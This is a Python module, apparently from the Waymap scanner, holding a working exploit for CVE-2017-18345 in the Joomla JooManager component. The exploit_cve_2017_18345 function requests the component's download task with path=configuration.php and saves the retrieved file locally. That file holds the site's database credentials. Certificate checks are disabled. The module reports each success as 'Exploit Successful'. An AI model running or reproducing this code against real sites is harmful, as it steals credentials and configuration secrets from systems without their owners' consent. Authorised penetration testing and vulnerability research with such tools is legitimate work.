# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2017-18345

import urllib.request as urllib2
from bs4 import BeautifulSoup
import urllib.parse as urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TerminalColors:
    red = '\033[31m'
    green = '\033[32m'
    blue = '\033[34m'
    cyan = '\033[36m'
    purple = '\033[35m'
    yellow = '\033[33m'
    white = '\033[37m'
    default = '\033[0m'

def exploit_cve_2017_18345(profile_url):
    try:
        download_path = "index.php?option=com_joomanager&controller=details&task=download&path=configuration.php"
        full_url = profile_url.rstrip('/') + '/' + download_path

        try:
            base_url = urlparse.urlparse(profile_url).path
            clean_url = profile_url.replace(base_url, "")
            response = requests.get(clean_url, verify=False)
        except Exception as e:
            print(TerminalColors.red + "[!] Error while accessing clean URL: " + str(e))
            return False

        file_response = urllib2.urlopen(full_url)
        soup = BeautifulSoup(response.content.decode('utf-8', 'ignore'), 'html.parser')
        page_title = soup.title.text if soup.title else "downloaded_file"
        sanitized_title = "".join(c for c in page_title if c.isalnum() or c in (' ', '_')).rstrip()

        with open(f"{sanitized_title}.php", "wb") as file:
            file.write(file_response.read())

        print(TerminalColors.green + "[*] Exploit Successful:")
        print(TerminalColors.cyan + "[*] Target: " + clean_url)
        print(TerminalColors.cyan + "[*] Page Title: " + page_title)
        print(TerminalColors.yellow + f"[*] File Saved as: {sanitized_title}.php")
        print(TerminalColors.cyan + "[*] Exploit Path: " + download_path)

        return True 

    except Exception as e:
        print(TerminalColors.red + "[!] Exploit failed for Target: " + profile_url)
        print(TerminalColors.red + "Error: " + str(e))
        return False 

def scan_cve_2017_18345(profile_url):
    print(TerminalColors.green + "[*] Starting Exploit..." + TerminalColors.default)
    success = exploit_cve_2017_18345(profile_url)

    if success:
        print(TerminalColors.green + "[*] Exploit Complete" + TerminalColors.default)
    else:
        print(TerminalColors.red + "[*] Exploit Failed" + TerminalColors.default)
    
    return success  
